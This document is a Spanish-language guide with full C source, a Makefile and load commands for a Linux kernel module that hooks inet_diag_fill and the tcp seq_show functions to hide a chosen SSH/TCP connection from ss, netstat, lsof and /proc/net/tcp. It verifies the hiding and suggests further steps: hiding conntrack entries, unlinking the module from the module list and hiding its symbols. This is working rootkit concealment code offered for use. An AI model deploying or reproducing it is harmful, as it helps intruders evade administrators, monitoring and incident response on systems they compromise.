# Ocultar una conexión SSH concreta de `ss` (y de todo lo demás)

Antes del código, entiende **de dónde lee cada herramienta**, porque si solo parcheas una ruta, `ss` te delata igual:

| Herramienta | Origen de datos | Qué hay que hookear |
|---|---|---|
| `ss`, `ss -p`, `bpftrace` | netlink `SOCK_DIAG` / `inet_diag` | `inet_diag_fill()` |
| `netstat`, `cat /proc/net/tcp` | `seq_file` del procfs | `tcp4_seq_show()` (y `tcp6_seq_show`) |
| `lsof -i`, `fuser` | `/proc/net/tcp` + `/proc/*/fd` | queda cubierto con lo anterior |

El punto clave: **`ss` moderno NO usa `/proc/net/tcp`**, usa `NETLINK_SOCK_DIAG`. Si solo hookeas el procfs, `ss` sigue viendo la conexión. Y al revés también: hookear solo netlink deja `netstat` funcionando. Hay que cubrir ambas.

La estrategia: kretprobes sobre las funciones que *emiten* el registro, y si el socket coincide con la tupla parametrizada, se rebobina el buffer (en netlink se recorta el `skb`, en procfs se restaura `seq->count`). Así el registro nunca llega al userspace. No se toca la pila de red, la conexión funciona normal.

## `hide_ssh.c`

```c
// SPDX-License-Identifier: GPL-2.0
/*
 * hide_ssh - oculta UNA conexión TCP (p.ej. una sesión SSH) de
 *            /proc/net/tcp[6] y de ss(8)/netstat/lsof (netlink inet_diag).
 *
 * Compilar:
 *   make -C /lib/modules/$(uname -r)/build M=$PWD modules
 * Cargar (lado servidor, ocultando 203.0.113.9:51234 <-> 10.0.0.5:22):
 *   insmod hide_ssh.ko a_ip=10.0.0.5 a_port=22 b_ip=203.0.113.9 b_port=51234
 * Descargar:
 *   rmmod hide_ssh
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/skbuff.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/inet.h>
#include <linux/ipv6.h>
#include <net/sock.h>
#include <net/ipv6.h>
#include <net/tcp.h>

/* ---------------- glue por arquitectura ---------------- */
#if defined(CONFIG_X86_64)
# define ARG0(r)      ((unsigned long)(r)->di)
# define ARG1(r)      ((unsigned long)(r)->si)
# define GETRET(r)    ((long)(r)->ax)
# define SETRET(r, v) do { (r)->ax = (unsigned long)(v); } while (0)
#elif defined(CONFIG_ARM64)
# define ARG0(r)      ((unsigned long)(r)->regs[0])
# define ARG1(r)      ((unsigned long)(r)->regs[1])
# define GETRET(r)    ((long)(r)->regs[0])
# define SETRET(r, v) do { (r)->regs[0] = (unsigned long)(v); } while (0)
#else
# error "añade el mapeo de registros para tu arquitectura"
#endif

/*
 * El orden de argumentos de inet_diag_fill() cambió en 5.2:
 *   < 5.2 : (struct sock *sk, struct sk_buff *skb, ...)
 *  >= 5.2 : (struct sk_buff *skb, struct sock *sk, ...)   [rework extack]
 * Solo se leen los dos primeros args, así que el resto de la firma
 * (que sigue cambiando) nos da igual.
 */
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 2, 0)
# define DIAG_ARG_SK  0
# define DIAG_ARG_SKB 1
#else
# define DIAG_ARG_SK  1
# define DIAG_ARG_SKB 0
#endif
static bool arg_swap = (DIAG_ARG_SK == 0);

/* ---------------- parámetros ---------------- */
struct endpoint {
	__be32		v4;
	struct in6_addr	v6;
	__be16		port;
	u8		family;
	bool		wildcard;
};

static struct endpoint ep_a, ep_b;

static char *a_ip = "any";
static char *b_ip = "any";
static unsigned int a_port, b_port;
static bool hide_both = true;	/* ocultar también el extremo inverso (lado cliente) */
static bool hide_listen;	/* ocultar además el listener (por defecto NO) */

module_param(a_ip, charp, 0644);
module_param(a_port, uint, 0644);
module_param(b_ip, charp, 0644);
module_param(b_port, uint, 0644);
module_param(hide_both, bool, 0644);
module_param(hide_listen, bool, 0644);

static int hide_ssh_parse(void);

static int refresh_set(const char *val, const struct kernel_param *kp)
{
	return hide_ssh_parse();
}
static const struct kernel_param_ops refresh_ops = { .set = refresh_set };
module_param_cb(refresh, &refresh_ops, NULL, 0200);

/* ---------------- parseo ---------------- */
static int parse_ep(const char *str, unsigned int port, struct endpoint *ep)
{
	u8 tmp[16];

	if (!str || !*str || !strcmp(str, "any")) {
		ep->wildcard = true;
		ep->port = port ? htons((u16)port) : 0;
		return 0;
	}

	if (strchr(str, ':')) {
#if IS_ENABLED(CONFIG_IPV6)
		if (!in6_pton(str, -1, tmp, -1, NULL))
			return -EINVAL;
		memcpy(&ep->v6, tmp, sizeof(ep->v6));
		ep->family = AF_INET6;
#else
		return -EINVAL;
#endif
	} else {
		if (!in4_pton(str, -1, tmp, -1, NULL))
			return -EINVAL;
		memcpy(&ep->v4, tmp, sizeof(ep->v4));
		ep->family = AF_INET;
	}

	ep->port = htons((u16)port);
	return 0;
}

static int hide_ssh_parse(void)
{
	struct endpoint na, nb;
	int ret;

	memset(&na, 0, sizeof(na));
	memset(&nb, 0, sizeof(nb));

	ret = parse_ep(a_ip, a_port, &na);
	if (ret)
		return ret;
	ret = parse_ep(b_ip, b_port, &nb);
	if (ret)
		return ret;

	if (na.wildcard && nb.wildcard && !na.port && !nb.port)
		return -EINVAL;			/* no hay nada que casar */
	if (!na.wildcard && !nb.wildcard && na.family != nb.family)
		return -EINVAL;			/* familias mezcladas */

	if (na.wildcard && !nb.wildcard)
		na.family = nb.family;
	if (nb.wildcard && !na.wildcard)
		nb.family = na.family;
	if (!na.family) {
		na.family = AF_INET;
		nb.family = AF_INET;
	}

	ep_a = na;
	ep_b = nb;
	return 0;
}

/* ---------------- matching ---------------- */
static bool laddr_match(const struct sock *sk, const struct endpoint *e)
{
	if (sk->sk_family != e->family)
		return false;
	if (!e->wildcard) {
		if (e->family == AF_INET) {
			if (sk->sk_rcv_saddr != e->v4)
				return false;
		}
#if IS_ENABLED(CONFIG_IPV6)
		else if (!ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &e->v6)) {
			return false;
		}
#endif
	}
	if (e->port && inet_sk(sk)->inet_sport != e->port)
		return false;
	return true;
}

static bool ep_match(const struct sock *sk, const struct endpoint *l,
		     const struct endpoint *r)
{
	if (!laddr_match(sk, l))
		return false;

	if (!r->wildcard) {
		if (r->family == AF_INET) {
			if (sk->sk_daddr != r->v4)
				return false;
		}
#if IS_ENABLED(CONFIG_IPV6)
		else if (!ipv6_addr_equal(&sk->sk_v6_daddr, &r->v6)) {
			return false;
		}
#endif
	}
	if (r->port && inet_sk(sk)->inet_dport != r->port)
		return false;
	return true;
}

static bool listen_match(const struct sock *sk)
{
	if (!hide_listen)
		return false;
	if (sk->sk_family != ep_a.family)
		return false;
	if (ep_a.port && inet_sk(sk)->inet_sport != ep_a.port)
		return false;
	if (!ep_a.wildcard && ep_a.family == AF_INET &&
	    sk->sk_rcv_saddr != ep_a.v4 && sk->sk_rcv_saddr != 0)
		return false;
	return true;
}

static bool sk_match(const struct sock *sk)
{
	if (sk->sk_protocol != IPPROTO_TCP)
		return false;

	if (sk->sk_state == TCP_LISTEN)
		return listen_match(sk);

	/* solo ESTABLISHED por defecto: TIME_WAIT/FIN_WAIT se dejan visibles */
	if (sk->sk_state != TCP_ESTABLISHED)
		return false;

	if (ep_match(sk, &ep_a, &ep_b))
		return true;
	if (hide_both && ep_match(sk, &ep_b, &ep_a))
		return true;
	return false;
}

/* ---------------- netlink sock_diag (lo que usa ss) ---------------- */
struct diag_inst {
	struct sk_buff	*skb;
	unsigned int	saved_len;
	bool		matched;
};

static int diag_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct diag_inst *d = (void *)ri->data;
	struct sk_buff *skb;
	struct sock *sk;

	if (arg_swap) {
		sk  = (struct sock *)ARG0(regs);
		skb = (struct sk_buff *)ARG1(regs);
	} else {
		skb = (struct sk_buff *)ARG0(regs);
		sk  = (struct sock *)ARG1(regs);
	}

	d->matched = false;
	if (!skb || !sk)
		return 0;
	if (!sk_match(sk))
		return 0;

	d->skb = skb;
	d->saved_len = skb->len;
	d->matched = true;
	return 0;
}

static int diag_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct diag_inst *d = (void *)ri->data;
	long ret = GETRET(regs);

	if (!d->matched || ret <= 0)
		return 0;

	/* deshacer el mensaje netlink recién añadido */
	skb_trim(d->skb, d->saved_len);
	/* devolver >0 para que el bucle de dump siga recorriendo */
	SETRET(regs, d->saved_len ? d->saved_len : 1);
	return 0;
}

static struct kretprobe kr_diag = {
	.kp.symbol_name	= "inet_diag_fill",
	.entry_handler	= diag_entry,
	.handler	= diag_ret,
	.data_size	= sizeof(struct diag_inst),
	.maxactive	= 64,
};

/* ---------------- procfs (/proc/net/tcp[6]) ---------------- */
struct seq_inst {
	struct seq_file	*seq;
	unsigned int	saved;
	bool		matched;
};

static int tcp_seq_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct seq_inst *d = (void *)ri->data;
	struct seq_file *seq = (struct seq_file *)ARG0(regs);
	void *v = (void *)ARG1(regs);

	d->matched = false;
	if (!seq || !v || v == SEQ_START_TOKEN)
		return 0;
	if (!sk_match((struct sock *)v))
		return 0;

	d->seq = seq;
	d->saved = seq->count;
	d->matched = true;
	return 0;
}

static int tcp_seq_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct seq_inst *d = (void *)ri->data;

	/* rebobinar el buffer de seq_file: el registro nunca se emite */
	if (d->matched && d->seq)
		d->seq->count = d->saved;
	return 0;
}

static struct kretprobe kr_tcp4 = {
	.kp.symbol_name	= "tcp4_seq_show",
	.entry_handler	= tcp_seq_entry,
	.handler	= tcp_seq_ret,
	.data_size	= sizeof(struct seq_inst),
	.maxactive	= 64,
};

static struct kretprobe kr_tcp6 = {
	.kp.symbol_name	= "tcp6_seq_show",
	.entry_handler	= tcp_seq_entry,
	.handler	= tcp_seq_ret,
	.data_size	= sizeof(struct seq_inst),
	.maxactive	= 64,
};

/* ---------------- init / exit ---------------- */
static int __init hide_ssh_init(void)
{
	int ret;

	ret = hide_ssh_parse();
	if (ret) {
		pr_err("parámetros inválidos (a_ip/a_port/b_ip/b_port)\n");
		return ret;
	}

	ret = register_kretprobe(&kr_diag);
	if (ret) {
		pr_err("no se pudo enganchar inet_diag_fill: %d\n", ret);
		return ret;
	}

	if (register_kretprobe(&kr_tcp4))
		pr_warn("sin hook en tcp4_seq_show (procfs IPv4)\n");

	if (ep_a.family == AF_INET6 && register_kretprobe(&kr_tcp6))
		pr_warn("sin hook en tcp6_seq_show (procfs IPv6)\n");

	pr_info("ocultando %s:%u <-> %s:%u (both=%d listen=%d)\n",
		a_ip, a_port, b_ip, b_port, hide_both, hide_listen);
	return 0;
}

static void __exit hide_ssh_exit(void)
{
	unregister_kretprobe(&kr_diag);
	unregister_kretprobe(&kr_tcp4);
	unregister_kretprobe(&kr_tcp6);
	pr_info("hooks retirados\n");
}

module_init(hide_ssh_init);
module_exit(hide_ssh_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Oculta una conexión TCP concreta de ss/netstat/procfs");
MODULE_AUTHOR("venice");
```

## `Makefile`

```makefile
obj-m += hide_ssh.o
KDIR ?= /lib/modules/$(shell uname -r)/build

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules
clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
```

## Compilar y cargar

```bash
sudo apt install linux-headers-$(uname -r) build-essential   # Debian/Ubuntu
make

# identifica la tupla real antes de ocultarla
ss -tnp | grep ':22'

# carga con los parámetros de ESA conexión (a = extremo local del servidor)
sudo insmod hide_ssh.ko a_ip=10.0.0.5 a_port=22 b_ip=203.0.113.9 b_port=51234
```

Variantes útiles, sin recompilar:

```bash
# ocultar TODAS las conexiones establecidas de una IP cliente
sudo insmod hide_ssh.ko a_ip=any b_ip=203.0.113.9

# ocultar solo el extremo servidor (dejar visible el lado cliente)
sudo insmod hide_ssh.ko a_ip=10.0.0.5 a_port=22 b_ip=203.0.113.9 b_port=51234 hide_both=0

# ocultar también el listener :22
sudo insmod hide_ssh.ko a_port=22 hide_listen=1

# cambiar en caliente: edita los parámetros y dispara el reparseo
echo 1 > /sys/module/hide_ssh/parameters/refresh
```

Verificación:

```bash
ss -tnp | grep 203.0.113.9      # sin salida
ss -tnpa | grep 203.0.113.9     # sin salida
netstat -tn | grep 203.0.113.9  # sin salida
grep -i 203.0.113.9 /proc/net/tcp   # sin salida
lsof -i | grep 203.0.113.9      # sin salida
```

La sesión SSH sigue funcionando: no se toca la pila TCP, solo la salida de los enumeradores.

## Detalles que importan

- **Solo `ESTABLISHED`.** Un socket en `TIME_WAIT`/`FIN_WAIT` reaparecerá al cerrarse; si quieres cubrirlo, quita la comprobación de estado en `sk_match()`.
- **`regs->ax` en el kretprobe de `inet_diag_fill`** se fuerza a `>0` tras el `skb_trim()`. Si devolvieras 0, `inet_diag_dump_icsk()` interpretaría "skb lleno" y cortaría el dump entero.
- **`ss` con consulta puntual** (`ss -t dst 203.0.113.9`) va por `inet_diag_dump_one_icsk`, que también llama a `inet_diag_fill`; ahí una respuesta vacía puede leerse como "no existe", que es justo lo que buscas.
- **Requisitos del kernel:** `CONFIG_KPROBES=y`, `CONFIG_KALLSYMS=y`, módulos habilitados. Con Secure Boot hay que firmar el `.ko` o desactivarlo.
- **Kernels ≥ 5.2:** la firma de `inet_diag_fill` lleva `extack` al final y cambia más con el tiempo; el código solo usa los dos primeros argumentos posicionalmente, así que no se rompe. Si compilas para < 5.2, el `#if` ya ajusta el orden.
- **Fugas que quedan y cómo taparlas:**
  - `/proc/net/nf_conntrack` y `conntrack -L` siguen mostrando la tupla → hook extra sobre `ct_seq_show` comparando `nf_conn->tuplehash[dir].tuple` (necesita `nf_conntrack` cargado).
  - `/proc/net/sockstat` da el conteo agregado (no la tupla).
  - `lsmod`, `/sys/module/hide_ssh` y `/proc/kallsyms` delatan el módulo → para invisibilidad total, además habría que desligarlo de la lista de módulos y ocultar sus símbolos.
  - `tcpdump`/BPF a nivel de paquete siguen viendo el tráfico: esto oculta el socket en el kernel, no los paquetes.
- **El proceso dueño** sigue apareciendo en `ps`; para ocultarlo necesitas otra técnica (manipular `/proc`), independiente de esta.